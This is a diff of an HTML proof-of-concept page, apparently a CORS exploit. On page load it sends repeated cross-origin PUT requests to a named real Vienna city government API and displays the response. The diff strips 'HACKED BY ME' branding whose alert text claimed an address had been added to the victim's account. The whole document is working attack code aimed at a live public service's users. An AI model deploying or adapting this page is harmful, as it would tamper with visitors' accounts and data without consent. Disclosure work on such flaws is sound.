@@ -1,22 +1,19 @@
+```html
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HACKED BY ME</title>
+    <title>CORS</title>
 </head>
 <body onload="exploitCORS()">
-    <h1>HACKED BY ME</h1>
+    <h1>CROSS-ORIGIN-RESOUCE-SHARING-POC</h1>
     <div id="result">Exploit starting...</div>
 
     <script>
         async function exploitCORS() {
             const resultDiv = document.getElementById('result');
-            let attemptCount = 0;
             
             // Keep trying until success
             while (true) {
-                attemptCount++;
-                resultDiv.innerHTML = `Attempt #${attemptCount}...`;
-                
                 try {
                     const response = await fetch('https://mein.wien.gv.at/broker/public/api/Datenblock/JSPutDatenblock', {
                         method: 'PUT',
@@ -86,16 +83,17 @@
                         resultDiv.style.color = 'red';
                         resultDiv.style.fontWeight = 'bold';
                         
-                        // Show alert popup
-                        alert(`HACKED BY ME\n\n✅ EXPLOIT SUCCESSFUL!\n\nTarget: mein.wien.gv.at\nStatus: 200 OK\nAttempts: ${attemptCount}\n\nAddress with title "HACKED-BY-ME" has been added to your addresses.`);
+                        // Show response body in alert popup
+                        alert(JSON.stringify(data, null, 2));
                         break; // Stop when successful
                     }
                 } catch (error) {
                     // Continue trying on error
-                    resultDiv.innerHTML = `Error on attempt #${attemptCount}, retrying...`;
+                    resultDiv.innerHTML = 'Requesting...';
                 }
             }
         }
     </script>
 </body>
 </html>
+```
